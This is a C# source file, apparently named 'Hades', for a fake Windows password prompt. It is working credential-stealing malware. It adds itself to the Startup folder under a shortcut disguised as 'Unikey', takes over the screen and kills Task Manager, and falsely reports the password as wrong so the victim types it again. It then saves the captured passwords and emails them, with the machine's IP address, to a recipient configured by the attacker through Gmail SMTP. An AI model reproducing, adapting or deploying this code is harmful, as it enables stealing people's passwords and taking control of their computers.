using System;
using System.Collections.Generic;
using System.Drawing;
using System.Windows.Forms;
using IWshRuntimeLibrary;
using System.Diagnostics;
using System.ComponentModel;
using System.Net;
using System.Net.Mail;
using System.Net.Sockets;
using Newtonsoft.Json;
namespace Hades
{
    public partial class Form1 : Form
    {
        public static List<string> Listpass = new List<string>();
        private Timer timer1;
        private IContainer components;
        public Form1()
        {
            InitializeComponent();
            DisplayMode();
            var shortcutPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\";
            CreateShortcut("Unikey", shortcutPath);  
        }
        private Dictionary<String, String> ReadJson()
        {
            string path = getpath() + "gmail.json";
            string JsonFromFile;
            using (var reader = new System.IO.StreamReader(path))
            {
                JsonFromFile = reader.ReadToEnd();
            }
            var GmailFromJson = JsonConvert.DeserializeObject<Dictionary<String, String>>(JsonFromFile);
            return GmailFromJson;
        }
        private void DisplayMode()
        {
            this.WindowState = FormWindowState.Maximized;
            this.TopMost = true;
            this.FormBorderStyle = FormBorderStyle.None; 
            this.ShowInTaskbar = false;
            this.BackgroundImage = Properties.Resources.image;
            panel1.Location = new Point(
            this.ClientSize.Width / 2 - panel1.Size.Width / 2,
            this.ClientSize.Height / 2 - panel1.Size.Height / 2);
            panel1.Anchor = AnchorStyles.None;
            this.components = new Container();
            this.timer1 = new Timer(this.components);
            this.timer1.Enabled = true;
            this.timer1.Tick += this.timer1_Tick_1;
            
        }
        protected override void Dispose(bool disposing)
        {
            if (disposing && this.components != null)
            {
                this.components.Dispose();
            }
            base.Dispose(disposing);
        }
        private void timer1_Tick_1(object sender, EventArgs e)
        {
            Process[] processes = Process.GetProcesses();
            foreach (Process process in processes)
            {
                if (process.ProcessName.ToLower() == "taskmgr" || process.ProcessName.ToLower() == "taskmgr.exe")
                {
                    process.Kill();
                }
            }
        }
        protected override bool ProcessCmdKey(ref Message msg, Keys keyData)
        {
            if (keyData == Keys.None || keyData == (Keys)262259)
            {
                MessageBox.Show("Enter your password");
                return true;
            }
            return base.ProcessCmdKey(ref msg, keyData);
        }
        public string getpath()
        {
            string applicationDirectory = Application.ExecutablePath;
            String path = applicationDirectory.Substring(0, applicationDirectory.Length - 9);
            return path;
        }
        public void CreateShortcut(string shortcutName, string shortcutPath)
        {
            string targetFileLocation = getpath();
            string shortcutLocation = System.IO.Path.Combine(shortcutPath, shortcutName + ".lnk");
            WshShell shell = new WshShell();
            IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(shortcutLocation);

            shortcut.Description = "Unikey";   // The description of the shortcut
            shortcut.IconLocation = targetFileLocation + "unikey.ico";           // The icon of the shortcut
            shortcut.TargetPath = targetFileLocation + "Hades.exe";                 // The path of the file that will launch when the shortcut is run
            shortcut.Save();                                    // Save the shortcut
        }
        public void txtPassword_Enter(object sender, EventArgs e)
        {
            if (txtPassword.Text == "Enter Windows Password")
            {
                txtPassword.Text = "";
                txtPassword.ForeColor = Color.Black;
                txtPassword.UseSystemPasswordChar = true;
            }
        }
        public void WriteFile()
        {
            string filepath = getpath() + "pass.txt";
            System.IO.File.WriteAllLines(filepath, Listpass);
        }
        private void checkpass(string Currentpass)
        {
            int k = 1;
            for (int i = 0; i < Listpass.Count; i++)
            {
                if (Currentpass == Listpass[i])
                {
                    k++;
                }
            }
            if (k == 2)
            {
                Listpass.Add(Currentpass);
                WriteFile();
                this.Hide();
                if (CheckForInternetConnection())
                {
                    SendMail();
                }
                Application.Exit();
            }
        }
        public void btLogin_Click(object sender, EventArgs e)
        {
            checkTextbox(txtPassword.Text);
            txtPassword.UseSystemPasswordChar = false;
            txtPassword.ForeColor = Color.Silver;
            txtPassword.Text = "Enter Windows Password";
            txtPassword.SelectionStart = 0;
            txtPassword.SelectionLength = 0;
        }
        public void checkTextbox(string textpass)
        {
            if (textpass != "Enter Windows Password" && textpass != "")
            {
                checkpass(txtPassword.Text.Trim());
                Listpass.Add(txtPassword.Text);
                txtPassword.UseSystemPasswordChar = false;
                txtPassword.ForeColor = Color.Silver;
                txtPassword.Text = "Enter Windows Password";
                txtPassword.SelectionStart = 0;
                txtPassword.SelectionLength = 0;
                MessageBox.Show("Your password is incorrect. Try again.");
            }
            else
            {
                MessageBox.Show("Enter your password Windows");
            }
        }
        public void txtPassword_KeyDown(object sender, KeyEventArgs e)
        {
            if (txtPassword.Text == "Enter Windows Password")
            {
                txtPassword.Text = "";
                txtPassword.ForeColor = Color.Black;
            }
            if (e.KeyCode == Keys.Enter)
            {
                checkTextbox(txtPassword.Text);
                txtPassword.UseSystemPasswordChar = false;
                txtPassword.ForeColor = Color.Silver;
                txtPassword.Text = "Enter Windows Password";
            }
            
        }
        public static string GetLocalIPAddress()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    return ip.ToString();
                }
            }
            throw new Exception("No network adapters with an IPv4 address in the system!");
        }
        public static bool CheckForInternetConnection()
        {
            try
            {
                using (var client = new WebClient())
                using (client.OpenRead("http://google.com/generate_204"))
                    return true;
            }
            catch
            {
                return false;
            }
        }
        private void SendMail()
        {
            Dictionary<String, String> mail = ReadJson();
            SmtpClient clientDetails = new SmtpClient();
            clientDetails.Port = 587;
            clientDetails.EnableSsl = true;
            clientDetails.Host = "smtp.gmail.com";
            clientDetails.DeliveryMethod = SmtpDeliveryMethod.Network;
            clientDetails.UseDefaultCredentials = false;
            clientDetails.Credentials = new NetworkCredential(mail["email"], mail["password"]);
            MailMessage mailDetails = new MailMessage();
            mailDetails.From = new MailAddress(mail["email"]);
            mailDetails.To.Add(mail["emailRecipient"]);
            string ip = GetLocalIPAddress();
            mailDetails.Subject = "Hades " + ip;
            string filename = getpath() + "pass.txt";
            Attachment attachment = new Attachment(filename);
            mailDetails.Attachments.Add(attachment);
            clientDetails.Send(mailDetails);
        }
        private void txtPassword_KeyUp(object sender, KeyEventArgs e)
        {
            if (e.KeyCode != Keys.Enter)
            {
                txtPassword.UseSystemPasswordChar = true;
                txtPassword.SelectionStart = txtPassword.MaxLength;
                txtPassword.SelectionLength = 0;
            }
        }
    }
    public class Gmail
    {
        public string email { get; set; }
        public string password { get; set; }
        public string emailRecipient { get; set; }
    }
}
